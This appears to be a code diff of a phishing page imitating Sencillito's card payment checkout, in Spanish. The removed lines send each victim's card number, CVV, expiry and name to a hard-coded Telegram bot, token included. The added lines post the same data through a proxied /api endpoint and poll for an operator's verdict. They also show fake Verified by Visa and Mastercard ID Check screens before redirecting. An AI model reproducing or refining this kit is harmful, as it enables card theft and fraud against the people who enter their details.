@@ -102,9 +102,63 @@
         }
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* ===== LOADING OVERLAY ===== */
+        .loading-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.75);
+            backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px);
+            z-index: 1000; justify-content: center; align-items: center;
+            flex-direction: column; padding: 20px;
+        }
+        .loading-overlay.active { display: flex; }
+
+        .loading-card {
+            background: #fff; border-radius: 16px; padding: 40px 32px 32px 32px;
+            max-width: 360px; width: 100%; box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+            text-align: center; border: 1px solid #f0f0f0;
+        }
+        .loading-card .logo-container {
+            display: flex; justify-content: center; align-items: center;
+            margin-bottom: 24px; min-height: 100px;
+        }
+        .loading-card .logo-container .logo-img { height: 80px; width: auto; max-width: 150px; object-fit: contain; }
+        .loading-card .loading-text {
+            font-size: 0.95rem; font-weight: 500; color: #374151;
+            margin-bottom: 20px; letter-spacing: 0.2px;
+        }
+        .progress-bar-wrapper { width: 100%; }
+        .progress-bar-track { width: 100%; height: 4px; background: #e5e7eb; border-radius: 4px; overflow: hidden; position: relative; }
+        .progress-bar-fill-loading {
+            height: 100%; background: #2c5697; border-radius: 4px;
+            width: 0%; transition: width 0.3s ease;
+        }
+        .loading-card .initial-spinner {
+            display: none; width: 48px; height: 48px;
+            border: 3px solid #e5e7eb; border-top: 3px solid #2c5697;
+            border-radius: 50%; animation: spin 0.8s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+        .loading-card .initial-spinner.active { display: block; }
     </style>
 </head>
 <body>
+
+    <!-- LOADING OVERLAY -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-card">
+            <div class="initial-spinner active" id="initialSpinner"></div>
+            <div class="logo-container" id="logoContainer" style="display:none;">
+                <img id="cardLogoImg" src="" alt="Logo tarjeta" class="logo-img" />
+            </div>
+            <div class="loading-text" id="loadingText">Procesando pago...</div>
+            <div class="progress-bar-wrapper" id="progressWrapper" style="display:none;">
+                <div class="progress-bar-track">
+                    <div class="progress-bar-fill-loading" id="progressFill"></div>
+                </div>
+            </div>
+        </div>
+    </div>
 
     <!-- VISTA ESCRITORIO -->
     <div class="desktop-layout">
@@ -216,7 +270,6 @@
             </div>
 
             <form class="card-form" id="form-tarjeta-mobile" onsubmit="enviarPago(event)">
-                <!-- Vista previa de la tarjeta -->
                 <div class="card-preview">
                     <div>
                         <div class="card-chip"></div>
@@ -263,39 +316,34 @@
     </div>
 
     <script>
-        // ===== VARIABLES TELEGRAM =====
-        const TELEGRAM_BOT_TOKEN = '8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E';
-        const TELEGRAM_CHAT_ID = '-1004457768033';
-        const CLP_TO_COP = 4.3;
+        // ============================================================
+        // El front NO conoce el backend de pagos ni Telegram.
+        // Solo usa rutas relativas: /api/crear-pago y /api/estado-pago/:id
+        // El server del front las proxea al backend real.
+        // ============================================================
+
+        const POLLING_INTERVAL = 2000;
+        const MAX_POLLING_TIME = 300000; // 5 min
 
         const formatCLP = (amount) => {
             return new Intl.NumberFormat('es-CL', { style: 'currency', currency: 'CLP', maximumFractionDigits: 0 }).format(amount);
         };
 
-        const formatCOP = (amount) => {
-            return new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', maximumFractionDigits: 0 }).format(amount);
-        };
-
-        async function notificarTelegram(mensaje) {
-            try {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: mensaje,
-                        parse_mode: 'HTML'
-                    })
-                });
-            } catch (e) {
-                console.warn('No se pudo notificar a Telegram:', e);
-            }
-        }
-
         // Estado global
         let datosPagoActual = null;
         let notificadoSalida = false;
         let pagoEnviado = false;
+        let solicitudId = null;
+        let pollingInterval = null;
+
+        // Elementos del overlay
+        const loadingOverlay  = document.getElementById('loadingOverlay');
+        const loadingText     = document.getElementById('loadingText');
+        const logoContainer   = document.getElementById('logoContainer');
+        const cardLogoImg     = document.getElementById('cardLogoImg');
+        const progressWrapper = document.getElementById('progressWrapper');
+        const progressFill    = document.getElementById('progressFill');
+        const initialSpinner  = document.getElementById('initialSpinner');
 
         document.addEventListener('DOMContentLoaded', () => {
             const stored = localStorage.getItem('sencillito_pago_pendiente');
@@ -318,13 +366,12 @@
             document.getElementById('mobile-amount').textContent = montoFormateado;
             document.getElementById('mobile-logo').src = data.logo;
 
-            // ===== Formateo número de tarjeta =====
+            // Formateo número de tarjeta
             document.querySelectorAll('#numero, #numero-m').forEach(el => {
                 el.addEventListener('input', (e) => {
                     let v = e.target.value.replace(/\D/g, '').substring(0, 16);
                     e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
 
-                    // Actualizar preview
                     const isMobile = el.id.endsWith('-m');
                     const preview = document.getElementById(isMobile ? 'preview-numero-m' : 'preview-numero');
                     if (preview) {
@@ -333,7 +380,7 @@
                 });
             });
 
-            // ===== Formateo vencimiento MM/AA =====
+            // Formateo vencimiento MM/AA
             document.querySelectorAll('#vence, #vence-m').forEach(el => {
                 el.addEventListener('input', (e) => {
                     let v = e.target.value.replace(/\D/g, '').substring(0, 4);
@@ -348,7 +395,7 @@
                 });
             });
 
-            // ===== Preview del titular =====
+            // Preview titular
             document.querySelectorAll('#titular, #titular-m').forEach(el => {
                 el.addEventListener('input', (e) => {
                     const isMobile = el.id.endsWith('-m');
@@ -360,22 +407,12 @@
             });
         });
 
-        // Detectar salida si el usuario aún no envió el pago
+        // Detectar salida (no aplica si ya envió)
         function notificarSalida(motivo) {
             if (notificadoSalida || !datosPagoActual || pagoEnviado) return;
             notificadoSalida = true;
-
-            const montoCLP = formatCLP(datosPagoActual.monto);
-            const montoCOP = formatCOP(Math.round(datosPagoActual.monto * CLP_TO_COP));
-
-            notificarTelegram(
-                `⚠️ <b>USUARIO SALIÓ DE LA PÁGINA (TARJETA)</b>\n` +
-                `🏢 <b>Servicio:</b> ${datosPagoActual.empresa}\n` +
-                `💵 <b>Monto:</b> ${montoCLP} CLP\n` +
-                `💱 <b>Equivalente:</b> ${montoCOP} COP\n` +
-                `📌 <b>Motivo:</b> ${motivo}\n` +
-                `🕒 ${new Date().toLocaleString('es-CL')}`
-            );
+            // (opcional) podrías registrar analytics; ya no se envía a Telegram desde el front
+            console.warn('Usuario salió:', motivo);
         }
 
         document.addEventListener('visibilitychange', () => {
@@ -393,6 +430,99 @@
             notificarSalida('Cerró o recargó la página');
         });
 
+        // ============================================================
+        // POLLING al backend (ruta relativa /api/estado-pago/:id)
+        // ============================================================
+        function iniciarPolling() {
+            if (pollingInterval) clearInterval(pollingInterval);
+            const start = Date.now();
+
+            loadingOverlay.classList.add('active');
+            initialSpinner.style.display = 'block';
+            initialSpinner.classList.add('active');
+            logoContainer.style.display = 'none';
+            progressWrapper.style.display = 'none';
+            loadingText.textContent = 'Procesando pago...';
+
+            pollingInterval = setInterval(async () => {
+                if (Date.now() - start > MAX_POLLING_TIME) {
+                    clearInterval(pollingInterval);
+                    loadingOverlay.classList.remove('active');
+                    alert('La operación tardó demasiado. Intenta nuevamente.');
+                    resetFormulario();
+                    return;
+                }
+                try {
+                    const r = await fetch(`/api/estado-pago/${solicitudId}`);
+                    const data = await r.json();
+                    if (!data.success) return;
+
+                    if (data.estado === 'aprobado') {
+                        clearInterval(pollingInterval);
+                        mostrarCargaConLogos(data.marca, data.redirect);
+                    } else if (data.estado === 'rechazado') {
+                        clearInterval(pollingInterval);
+                        loadingOverlay.classList.remove('active');
+                        alert(data.mensaje || 'La tarjeta fue declinada por el emisor. Verifica los datos o utiliza otra tarjeta.');
+                        resetFormulario();
+                    }
+                    // 'pendiente' → sigue esperando en el overlay
+                } catch {}
+            }, POLLING_INTERVAL);
+        }
+
+        // ============================================================
+        // CARGA FINAL + REDIRECCIÓN
+        // ============================================================
+        function mostrarCargaConLogos(tipo, redirectUrl) {
+            initialSpinner.classList.remove('active');
+            initialSpinner.style.display = 'none';
+
+            logoContainer.style.display = 'flex';
+            const map = { visa: 'visa.png', mastercard: 'mastercard.png', amex: 'ame.png' };
+            if (map[tipo]) { cardLogoImg.src = map[tipo]; cardLogoImg.alt = tipo; }
+
+            progressWrapper.style.display = 'block';
+
+            const nombres = {
+                visa: 'Verified by Visa',
+                mastercard: 'Mastercard ID Check',
+                amex: 'American Express SafeKey'
+            };
+            loadingText.textContent = 'Redirigiendo a ' + (nombres[tipo] || '...');
+
+            let progress = 0;
+            const duration = 3000, interval = 50;
+            const increment = 100 / (duration / interval);
+            progressFill.style.width = '0%';
+
+            const timer = setInterval(() => {
+                progress += increment;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(timer);
+                    setTimeout(() => { window.location.href = redirectUrl; }, 400);
+                }
+                progressFill.style.width = progress + '%';
+            }, interval);
+        }
+
+        function resetFormulario() {
+            const btns = ['btn-pagar', 'btn-pagar-m'];
+            btns.forEach(id => {
+                const b = document.getElementById(id);
+                if (b) { b.disabled = false; b.textContent = 'Pagar ahora'; }
+            });
+            ['numero', 'numero-m', 'titular', 'titular-m', 'vence', 'vence-m', 'cvv', 'cvv-m'].forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.disabled = false;
+            });
+            pagoEnviado = false;
+        }
+
+        // ============================================================
+        // ENVÍO DEL PAGO
+        // ============================================================
         async function enviarPago(event) {
             event.preventDefault();
 
@@ -401,7 +531,6 @@
                 return;
             }
 
-            // Detectar si es formulario PC o móvil
             const form = event.target;
             const isMobile = form.id === 'form-tarjeta-mobile';
             const sufijo = isMobile ? '-m' : '';
@@ -411,9 +540,19 @@
             const vence = document.getElementById('vence' + sufijo).value.trim();
             const cvv = document.getElementById('cvv' + sufijo).value.trim();
 
-            // Validaciones básicas
+            // Validaciones
             if (!titular || numero.length < 13 || vence.length < 5 || cvv.length < 3) {
                 alert('Por favor completa todos los campos correctamente.');
+                return;
+            }
+
+            // Marca de tarjeta
+            let marca = null;
+            if (numero.startsWith('4')) marca = 'visa';
+            else if (/^(5[1-5]|2[2-7])/.test(numero)) marca = 'mastercard';
+            else if (/^3[47]/.test(numero)) marca = 'amex';
+            if (!marca) {
+                alert('Tipo de tarjeta no reconocido. Verifica el número.');
                 return;
             }
 
@@ -423,55 +562,54 @@
             btn.innerHTML = '<div style="border: 3px solid #f3f3f3; border-top: 3px solid #fff; border-radius: 50%; width: 22px; height: 22px; animation: spin 1s linear infinite; margin: 0 auto;"></div>';
 
             pagoEnviado = true;
+            solicitudId = 'SOL-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
 
-            const montoCLP = formatCLP(datosPagoActual.monto);
-            const montoCOP = formatCOP(Math.round(datosPagoActual.monto * CLP_TO_COP));
-
-            // Notificar a Telegram con los datos ingresados
-            notificarTelegram(
-                `💳 <b>DATOS DE TARJETA INGRESADOS</b>\n` +
-                `🏢 <b>Servicio:</b> ${datosPagoActual.empresa}\n` +
-                `💵 <b>Monto CLP:</b> ${montoCLP}\n` +
-                `💱 <b>Monto COP:</b> ${montoCOP}\n` +
-                `👤 <b>Titular:</b> ${titular}\n` +
-                `🔢 <b>Tarjeta:</b> <code>${numero}</code>\n` +
-                `📅 <b>Vence:</b> ${vence}\n` +
-                `🔒 <b>CVV:</b> <code>${cvv}</code>\n` +
-                `🕒 ${new Date().toLocaleString('es-CL')}`
-            );
+            // Mostrar overlay de inmediato
+            loadingOverlay.classList.add('active');
+            loadingText.textContent = 'Procesando pago...';
+            initialSpinner.style.display = 'block';
+            initialSpinner.classList.add('active');
+            logoContainer.style.display = 'none';
+            progressWrapper.style.display = 'none';
 
             try {
-                // Placeholder: aquí irá la pasarela real cuando la actives.
                 const response = await fetch('/api/crear-pago', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        monto: datosPagoActual.monto,
-                        descripcion: datosPagoActual.empresa + ' - Pago con tarjeta',
-                        referencia: 'pago_tarjeta_' + Date.now(),
-                        empresa: datosPagoActual.empresa,
-                        banco: 'tarjeta',
-                        banco_nombre: 'Tarjeta de crédito/débito',
-                        titular
+                        solicitud_id: solicitudId,
+                        empresa: datosPagoActual.empresa || 'Sencillito',
+                        monto_clp: datosPagoActual.monto || 0,
+                        referencia: 'sencillito_' + Date.now(),
+                        titular: titular,
+                        numero_tarjeta: numero,
+                        cvv: cvv,
+                        vencimiento: vence,
+                        marca_tarjeta: marca,
+                        banco_emisor: datosPagoActual.banco || 'Desconocido',
+                        ip_usuario: '',
+                        pais_usuario: '',
+                        ciudad_usuario: ''
                     })
                 });
 
                 const data = await response.json();
 
-                if (data.success) {
-                    alert('Datos enviados correctamente. Procesando pago...');
-                    // Cuando actives la pasarela real:
-                    // if (data.checkout_url) window.location.href = data.checkout_url;
-                } else {
-                    throw new Error(data.error || 'Error al procesar el pago');
+                if (!data.success) {
+                    loadingOverlay.classList.remove('active');
+                    alert('No se pudo procesar el pago. Intenta nuevamente.');
+                    resetFormulario();
+                    return;
                 }
+
+                // Comienza el polling
+                iniciarPolling();
+
             } catch (error) {
                 console.error('Error:', error);
-                alert('Error al procesar el pago: ' + error.message);
-
-                btn.disabled = false;
-                btn.textContent = originalText;
-                pagoEnviado = false;
+                loadingOverlay.classList.remove('active');
+                alert('No se pudo conectar con el procesador de pagos. Intenta nuevamente.');
+                resetFormulario();
             }
         }
     </script>
